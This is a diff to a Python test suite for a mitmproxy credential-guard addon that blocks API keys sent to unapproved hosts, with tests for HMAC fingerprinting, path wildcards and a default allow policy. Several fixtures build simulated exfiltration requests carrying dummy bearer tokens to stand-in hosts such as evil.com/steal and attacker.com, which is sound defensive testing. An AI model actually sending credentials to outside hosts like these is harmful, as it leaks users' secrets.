@@ -98,8 +98,10 @@ class TestCredentialGuardBlocking:
         flow = make_flow(
             method="POST",
             url="https://evil.com/steal",
-            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
+                "Content-Type": "application/json",
+            },
         )
 
         credential_guard.request(flow)
@@ -108,20 +110,24 @@ class TestCredentialGuardBlocking:
         assert flow.response.status_code == 403
         assert flow.metadata.get("blocked_by") == "credential-guard"
         assert flow.metadata.get("blocked_host") == "evil.com"
+        assert flow.metadata.get("credential_fingerprint", "").startswith("hmac:")
 
     def test_allows_openai_key_to_openai(self, credential_guard, make_flow):
-        """Test that OpenAI key to api.openai.com is allowed."""
+        """Test that OpenAI key to api.openai.com is allowed by DEFAULT_POLICY."""
         flow = make_flow(
             method="POST",
             url="https://api.openai.com/v1/chat/completions",
-            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
+                "Content-Type": "application/json",
+            },
         )
 
         credential_guard.request(flow)
 
         assert flow.response is None  # Not blocked
-        assert flow.metadata.get("credguard_passed") is True
+        # Should be allowed by DEFAULT_POLICY (not just passed checks)
+        assert flow.metadata.get("credguard_policy_approved") is True
 
     def test_blocks_key_in_header(self, credential_guard, make_flow):
         """Test that key in Authorization header to wrong host is blocked."""
@@ -129,7 +135,7 @@ class TestCredentialGuardBlocking:
             method="POST",
             url="https://attacker.com/api",
             headers={
-                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijklmno",
+                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                 "Content-Type": "application/json",
             },
         )
@@ -141,16 +147,23 @@ class TestCredentialGuardBlocking:
         assert b"credential-guard" in flow.response.headers.get("X-Blocked-By", "").encode()
 
     def test_blocks_key_in_url(self, credential_guard, make_flow):
-        """Test that key in URL query string to wrong host is blocked."""
-        flow = make_flow(
-            method="GET",
-            url="https://evil.com/api?key=sk-proj-abc123xyz456def789ghijklmno",
-        )
+        """Test that key in URL query string to wrong host is blocked (when URL scanning enabled)."""
+        # Enable URL scanning for this test
+        from mitmproxy.test import taddons
+        from mitmproxy import ctx as mitmproxy_ctx
 
-        credential_guard.request(flow)
+        with taddons.context(credential_guard) as tctx:
+            tctx.options.credguard_scan_urls = True
 
-        assert flow.response is not None
-        assert flow.response.status_code == 403
+            flow = make_flow(
+                method="GET",
+                url="https://evil.com/api?key=sk-proj-abc123xyz456def789ghijkghijklmno",
+            )
+
+            credential_guard.request(flow)
+
+            assert flow.response is not None
+            assert flow.response.status_code == 403
 
     def test_allows_non_credential_requests(self, credential_guard, make_flow):
         """Test that requests without credentials pass through."""
@@ -172,16 +185,18 @@ class TestTempAllowlist:
 
     def test_temp_allowlist_allows_blocked_request(self, credential_guard, make_flow):
         """Test that temp allowlist allows otherwise blocked requests."""
-        key = "sk-proj-abc123xyz456def789ghijklmno"
+        key = "sk-proj-abc123xyz456def789ghijkghijklmno"
 
-        # Add to allowlist
+        # Add to allowlist (v2: takes full credential, generates HMAC internally)
         credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)
 
         flow = make_flow(
             method="POST",
             url="https://evil.com/api",
-            content=f'{{"key": "{key}"}}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": f"Bearer {key}",
+                "Content-Type": "application/json",
+            },
         )
 
         credential_guard.request(flow)
@@ -193,7 +208,7 @@ class TestTempAllowlist:
         """Test that expired allowlist entries don't work."""
         import time
 
-        key = "sk-proj-abc123xyz456def789ghijklmno"
+        key = "sk-proj-abc123xyz456def789ghijkghijklmno"
 
         # Add with very short TTL
         credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=0)
@@ -204,8 +219,10 @@ class TestTempAllowlist:
         flow = make_flow(
             method="POST",
             url="https://evil.com/api",
-            content=f'{{"key": "{key}"}}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": f"Bearer {key}",
+                "Content-Type": "application/json",
+            },
         )
 
         credential_guard.request(flow)
@@ -246,8 +263,10 @@ class TestStats:
         flow = make_flow(
             method="POST",
             url="https://evil.com/api",
-            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
+                "Content-Type": "application/json",
+            },
         )
 
         credential_guard.request(flow)
@@ -267,6 +286,7 @@ class TestBlockingMode:
         guard._load_rules = lambda: None  # Skip loading
         from addons.credential_guard import DEFAULT_RULES
         guard.rules = list(DEFAULT_RULES)
+        guard.hmac_secret = b"test-secret"  # v2: Initialize HMAC secret
 
         # Mock _should_block to return False (warn-only mode)
         guard._should_block = lambda: False
@@ -274,8 +294,10 @@ class TestBlockingMode:
         flow = make_flow(
             method="POST",
             url="https://evil.com/steal",
-            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
+                "Content-Type": "application/json",
+            },
         )
 
         guard.request(flow)
@@ -295,6 +317,7 @@ class TestBlockingMode:
         guard._load_rules = lambda: None
         from addons.credential_guard import DEFAULT_RULES
         guard.rules = list(DEFAULT_RULES)
+        guard.hmac_secret = b"test-secret"  # v2: Initialize HMAC secret
 
         # Mock _should_block to return True (blocking mode)
         guard._should_block = lambda: True
@@ -302,8 +325,10 @@ class TestBlockingMode:
         flow = make_flow(
             method="POST",
             url="https://evil.com/steal",
-            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
-            headers={"Content-Type": "application/json"},
+            headers={
+                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
+                "Content-Type": "application/json",
+            },
         )
 
         guard.request(flow)
@@ -312,3 +337,249 @@ class TestBlockingMode:
         assert flow.response is not None
         assert flow.response.status_code == 403
         assert flow.metadata.get("blocked_by") == "credential-guard"
+
+
+class TestHMACFingerprinting:
+    """Tests for HMAC fingerprinting (Phase 1.2)."""
+
+    def test_hmac_fingerprint_deterministic(self):
+        """Same credential generates same fingerprint."""
+        from addons.credential_guard import hmac_fingerprint
+
+        secret = b"test-secret"
+        credential = "sk-proj-abc123xyz456def789ghijk"
+
+        fp1 = hmac_fingerprint(credential, secret)
+        fp2 = hmac_fingerprint(credential, secret)
+
+        assert fp1 == fp2
+        assert len(fp1) == 16  # First 16 chars of SHA256 HMAC
+
+    def test_hmac_fingerprint_unique(self):
+        """Different credentials generate different fingerprints."""
+        from addons.credential_guard import hmac_fingerprint
+
+        secret = b"test-secret"
+        cred1 = "sk-proj-abc123"
+        cred2 = "sk-proj-xyz789"
+
+        fp1 = hmac_fingerprint(cred1, secret)
+        fp2 = hmac_fingerprint(cred2, secret)
+
+        assert fp1 != fp2
+
+    def test_hmac_fingerprint_secret_matters(self):
+        """Different secrets generate different fingerprints."""
+        from addons.credential_guard import hmac_fingerprint
+
+        credential = "sk-proj-abc123"
+        secret1 = b"secret-one"
+        secret2 = b"secret-two"
+
+        fp1 = hmac_fingerprint(credential, secret1)
+        fp2 = hmac_fingerprint(credential, secret2)
+
+        assert fp1 != fp2
+
+    def test_temp_allowlist_uses_hmac(self, credential_guard):
+        """Verify allowlist stores HMAC, not raw credentials."""
+        key = "sk-proj-verysecretkey123"
+
+        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)
+
+        # Get allowlist entries
+        entries = credential_guard.get_temp_allowlist()
+
+        assert len(entries) == 1
+        assert entries[0]["credential_fingerprint"].startswith("hmac:")
+        # Should NOT contain raw credential
+        assert key not in str(entries)
+
+    def test_violation_log_never_contains_raw_credential(self, credential_guard, make_flow):
+        """Ensure _log_violation() never logs raw tokens."""
+        flow = make_flow(
+            method="POST",
+            url="https://evil.com/api",
+            headers={"Authorization": "Bearer sk-proj-secretkey123abcdefghij"},
+        )
+
+        credential_guard.request(flow)
+
+        # Check metadata - should have fingerprint, not raw credential
+        fingerprint = flow.metadata.get("credential_fingerprint", "")
+        assert fingerprint.startswith("hmac:")
+        assert "secretkey123" not in fingerprint
+        assert "sk-proj-secretkey123abcdefghij" not in str(flow.metadata)
+
+    def test_block_response_headers_contain_hmac(self, credential_guard, make_flow):
+        """X-Credential-Fingerprint header has hmac:xxx format."""
+        flow = make_flow(
+            method="POST",
+            url="https://attacker.com/api",
+            headers={"Authorization": "Bearer sk-proj-topsecret999abcdefghij"},
+        )
+
+        credential_guard.request(flow)
+
+        assert flow.response is not None
+        fingerprint_header = flow.response.headers.get("X-Credential-Fingerprint", "")
+        assert fingerprint_header.startswith("hmac:")
+        assert "topsecret" not in fingerprint_header
+
+
+class TestPathMatching:
+    """Tests for path wildcard matching (Phase 1.3)."""
+
+    def test_path_wildcard_suffix(self):
+        """Test /v1/* matches /v1/chat/completions."""
+        from addons.credential_guard import path_matches_pattern
+
+        assert path_matches_pattern("/v1/chat/completions", "/v1/*") is True
+        assert path_matches_pattern("/v1/", "/v1/*") is True
+        assert path_matches_pattern("/v1/models", "/v1/*") is True
+        assert path_matches_pattern("/v2/chat", "/v1/*") is False
+        assert path_matches_pattern("/api/v1/chat", "/v1/*") is False
+
+    def test_path_wildcard_prefix(self):
+        """Test */completions matches /v1/chat/completions."""
+        from addons.credential_guard import path_matches_pattern
+
+        assert path_matches_pattern("/v1/chat/completions", "*/completions") is True
+        assert path_matches_pattern("/api/completions", "*/completions") is True
+        assert path_matches_pattern("/completions", "*/completions") is True
+        assert path_matches_pattern("/v1/models", "*/completions") is False
+
+    def test_path_exact_match(self):
+        """Test exact path matching."""
+        from addons.credential_guard import path_matches_pattern
+
+        assert path_matches_pattern("/v1/chat/completions", "/v1/chat/completions") is True
+        assert path_matches_pattern("/v1/chat/completions", "/v1/chat") is False
+        assert path_matches_pattern("/v1/chat", "/v1/chat/completions") is False
+
+    def test_path_query_string_stripped(self):
+        """Test query strings are stripped before matching."""
+        from addons.credential_guard import path_matches_pattern
+
+        assert path_matches_pattern("/v1/chat?key=123", "/v1/*") is True
+        assert path_matches_pattern("/v1/chat/completions?model=gpt-4", "/v1/*") is True
+        assert path_matches_pattern("/api?foo=bar", "/api") is True
+
+    def test_path_full_wildcard(self):
+        """Test /* matches all paths."""
+        from addons.credential_guard import path_matches_pattern
+
+        assert path_matches_pattern("/anything", "/*") is True
+        assert path_matches_pattern("/v1/chat/completions", "/*") is True
+        assert path_matches_pattern("/", "/*") is True
+
+
+class TestDefaultPolicy:
+    """Tests for DEFAULT_POLICY behavior (Phase 1.3)."""
+
+    def test_openai_allowed_by_default_policy(self, credential_guard, make_flow):
+        """OpenAI keys to api.openai.com/v1/* allowed by default."""
+        flow = make_flow(
+            method="POST",
+            url="https://api.openai.com/v1/chat/completions",
+            headers={"Authorization": "Bearer sk-proj-abc123xyz456def789ghijk"},
+        )
+
+        credential_guard.request(flow)
+
+        # Should NOT block
+        assert flow.response is None
+        # Should be allowed by policy
+        assert flow.metadata.get("credguard_policy_approved") is True
+
+    def test_anthropic_allowed_by_default_policy(self, credential_guard, make_flow):
+        """Anthropic keys to api.anthropic.com/v1/* allowed by default."""
+        flow = make_flow(
+            method="POST",
+            url="https://api.anthropic.com/v1/messages",
+            headers={"Authorization": "Bearer sk-ant-api03-abc123xyz456def789ghijk"},
+        )
+
+        credential_guard.request(flow)
+
+        # Should NOT block
+        assert flow.response is None
+        assert flow.metadata.get("credguard_policy_approved") is True
+
+    def test_github_allowed_by_default_policy(self, credential_guard, make_flow):
+        """GitHub tokens to api.github.com allowed by default."""
+        flow = make_flow(
+            method="GET",
+            url="https://api.github.com/user",
+            headers={"Authorization": "Bearer ghp_abc123xyz456def789ghijklmnoABCDEFGHIJKL"},
+        )
+
+        credential_guard.request(flow)
+
+        # Should NOT block
+        assert flow.response is None
+        assert flow.metadata.get("credguard_policy_approved") is True
+
+    def test_openai_wrong_path_blocked(self, credential_guard, make_flow):
+        """OpenAI key to api.openai.com/admin/* blocked (not in default policy)."""
+        flow = make_flow(
+            method="POST",
+            url="https://api.openai.com/admin/secrets",
+            headers={"Authorization": "Bearer sk-proj-abc123xyz456abcdefghijk"},
+        )
+
+        credential_guard.request(flow)
+
+        # Should block (path not in policy)
+        assert flow.response is not None
+        assert flow.response.status_code == 403
+
+    def test_openai_wrong_host_blocked(self, credential_guard, make_flow):
+        """OpenAI key to evil.com blocked (not in default policy)."""
+        flow = make_flow(
+            method="POST",
+            url="https://evil.com/v1/chat/completions",
+            headers={"Authorization": "Bearer sk-proj-abc123xyz456abcdefghijk"},
+        )
+
+        credential_guard.request(flow)
+
+        # Should block (host not in policy)
+        assert flow.response is not None
+        assert flow.response.status_code == 403
+
+    def test_check_policy_approval_all_criteria(self):
+        """Policy approval requires pattern + host + path match."""
+        from addons.credential_guard import check_policy_approval, DEFAULT_POLICY
+
+        # All match - should approve
+        assert check_policy_approval(
+            "sk-proj-abc123",
+            "api.openai.com",
+            "/v1/chat/completions",
+            DEFAULT_POLICY
+        ) is True
+
+        # Wrong pattern - should reject
+        assert check_policy_approval(
+            "sk-ant-abc123",
+            "api.openai.com",
+            "/v1/chat/completions",
+            DEFAULT_POLICY
+        ) is False
+
+        # Wrong host - should reject
+        assert check_policy_approval(
+            "sk-proj-abc123",
+            "evil.com",
+            "/v1/chat/completions",
+            DEFAULT_POLICY
+        ) is False
+
+        # Wrong path - should reject
+        assert check_policy_approval(
+            "sk-proj-abc123",
+            "api.openai.com",
+            "/admin/secrets",
+            DEFAULT_POLICY
+        ) is False
